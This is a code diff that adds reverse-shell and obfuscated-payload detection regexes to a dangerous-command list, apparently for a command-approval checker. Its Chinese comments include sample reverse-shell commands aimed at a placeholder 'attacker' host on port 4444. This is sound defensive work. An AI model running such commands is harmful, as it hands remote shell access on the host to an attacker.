@@ -108,6 +108,24 @@ DANGEROUS_PATTERNS = [
     # 在root shell中执行的后续命令不再经过approval检查
     # 正则说明: (-\S+(?:\s+\S+)?\s+)* 匹配sudo的flag及可选参数值(如 -u root)，最终匹配 su/-i/-s
     (r'\bsudo\s+(-\S+(?:\s+\S+)?\s+)*(su\b|-i\b|-s\b)', "escalate to persistent root shell"),
+    # [反弹Shell检测] /dev/tcp是bash内置的网络重定向，常用于反弹shell
+    # 原理: bash /dev/tcp/<host>/<port> 可建立TCP连接，配合exec或重定向
+    # 实现反弹shell: exec 5<>/dev/tcp/attacker/4444; cat <&5 | bash >&5
+    # 正则说明: 匹配 /dev/tcp/ 或 /dev/udp/ 后跟主机端口，覆盖exec和重定向场景
+    (r'/dev/(tcp|udp)/\S+', "reverse shell via /dev/tcp or /dev/udp"),
+    # [反弹Shell检测] nc/ncat -e 将shell绑定到网络连接，是经典反弹shell手法
+    # 原理: nc -e /bin/bash attacker 4444 让攻击者获得交互式shell
+    # 正则说明: 匹配nc/ncat后跟-e或--exec，后接任意命令路径
+    (r'\b(ncat|nc)\s+.*(-e|--exec)\s+', "reverse shell via netcat -e"),
+    # [代码注入检测] base64解码后管道到shell执行，用于混淆恶意代码
+    # 原理: echo base64str | base64 -d | bash 绕过静态检测，实际执行任意代码
+    # 正则说明: 匹配base64 -d/--decode后跟管道到shell的模式
+    (r'\bbase64\s+.*(-d|--decode)\b.*\|\s*(ba)?sh\b', "base64-decoded payload piped to shell"),
+    # [反弹Shell检测] Python/Perl/Ruby内联反弹shell，比通用-c/-e检测更具体
+    # 原理: python -c 'import socket;socket.connect(...)' 等是反弹shell的常见写法
+    # 正则说明: 在-c/-e标志的脚本内容中检测socket/connect/bind/listen关键字组合
+    # 注意: 通用python -c模式(第89行)已捕获所有python -c调用，此模式提供更精确的风险描述
+    (r'\b(python[23]?|perl|ruby)\s+-[ec]\s+.*\b(socket|connect|bind|listen)\b', "reverse shell via script interpreter with socket"),
 ]
 
 if sys.platform == "win32":
